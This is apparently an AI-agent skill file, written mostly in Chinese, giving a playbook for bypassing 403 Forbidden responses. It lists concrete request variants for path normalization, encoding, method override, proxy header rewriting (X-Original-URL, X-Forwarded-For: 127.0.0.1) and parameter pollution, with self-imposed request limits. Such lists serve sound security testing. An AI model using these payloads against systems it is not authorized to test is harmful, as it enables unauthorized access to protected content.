---
name: 403-forbidden-bypass
description: >-
  Access-control bypass for 403 Forbidden responses. Use when a protected path
  returns 403 but may be reachable via path normalization, HTTP method override,
  or header-based URL rewriting (X-Original-URL, X-Rewrite-URL, X-Forwarded-*).
---

# SKILL: 403 Forbidden Bypass — Access-Control & Path-Rewrite Playbook

> **AI LOAD INSTRUCTION**: 403 Bypass 用于「路径存在但被授权/边缘层拒绝」的场景，目标是改变路由解析而非暴力枚举。所有变形均为无害探测，遵守「每端点 ≤5」与 Safe Payload；不得对同一端点无限变形。

## 1. 何时用

- 目标路径返回 403（接口/目录存在但被拒绝），且你有依据判断该路径真实存在（来自 recon / JS / 文档）。
- 授权层在网关 / WAF / 反向代理，怀疑后端未做同等级别校验。

## 2. 先判断 403 vs 404

| 状态 | 含义 | 动作 |
|---|---|---|
| 404 | 路径不存在或边缘完全拦截 | 停止，不深挖 |
| 403 | 路径存在但被拒绝 | 尝试下列绕过 |

## 3. 绕过变形（按优先级）

### 3.1 路径归一化
```text
/admin           →  /admin/
/admin           →  /admin/.          （尾点）
/admin           →  /admin//          （尾斜杠）
/admin           →  /./admin
/admin           →  /admin/%2e/       （编码点）
/admin           →  /admin%2fanything
/admin           →  /%2e/admin
/admin           →  /admin/..;/       （路径参数分隔）
/admin           →  /admin;/          （分号）
```

### 3.2 大小写与编码
```text
/Admin  /ADMIN  /aDmIn
/admin  →  /%61dmin     （单字符编码）
/admin  →  /%2fadmin    （前导编码斜杠）
/admin  →  /admin%00    （Null byte，旧服务器）
```

### 3.3 HTTP 方法覆盖
```text
GET /admin (403)  →  POST /admin
GET /admin (403)  →  HEAD /admin
GET /admin (403)  →  加头 X-HTTP-Method-Override: GET
GET /admin (403)  →  加头 X-Original-Method: GET
```

### 3.4 Header 重写（反向代理信任）
```text
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-Server: localhost
X-Custom-IP-Authorization: 127.0.0.1
Forwarded: for=127.0.0.1
```

### 3.5 参数污染（WAF/应用解析差异）
```text
/admin?foo=bar
/admin?foo=bar&foo=
/admin?%20
/admin?.
```

## 4. 验证标准（Pre-Execute Check）

- 预期结果明确：期望状态码 403→200，或响应体从「Forbidden」变为真实内容。
- 每端点总请求 ≤5，只挑 3-5 个最可能生效的变形，不做 wordlist 爆破。
- 命中 200 且泄露未授权内容 → 记录证据；否则停止该端点。

## 5. Related

- 对象级授权（BOLA/BFLA）: [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md)
- 认证绕过（登录/2FA）: [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md)
